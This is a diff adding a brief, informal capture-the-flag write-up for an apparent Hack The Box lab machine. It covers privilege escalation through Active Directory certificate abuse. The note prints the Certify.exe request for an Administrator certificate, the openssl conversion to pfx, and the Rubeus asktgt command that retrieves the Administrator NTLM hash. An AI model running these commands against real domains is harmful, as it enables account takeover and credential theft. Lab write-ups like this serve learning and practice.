@@ -1,0 +1,19 @@
+inital foothold has easy so not explaining it
+
+the priv esc was different
+
+bloodhound said something about spn tickets
+
+so, we did certify.exe to get certificate first and then rubesu sto get ntlm hash of admin
+
+the template was already there
+
+```
+.\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator
+
+openssl pkcs12 -in cert.pem -inkey private.key -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+
+convertinf both of the keys in pfk then upload it to server
+
+.\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials
+```
